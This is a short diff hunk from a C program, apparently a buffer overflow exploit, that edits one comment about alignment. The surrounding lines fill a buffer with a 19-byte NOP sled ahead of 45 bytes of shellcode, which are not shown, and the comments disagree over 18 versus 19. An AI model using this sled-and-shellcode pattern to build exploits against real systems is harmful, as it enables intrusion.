@@ -18,7 +18,7 @@ main ( int argc, char * argv[] )
 
     // Pad beginning with 19 NOP's ('\x90')
     // We use 18 because the shellcode is 45 bytes
-    // 19+45 = 64 which will keep the buf byte aligned
+    // 19+45 = 64 which will keep the buf word aligned
     for (i = 0 ; i < 19; i++)
         buf[i] = '\x90';
 
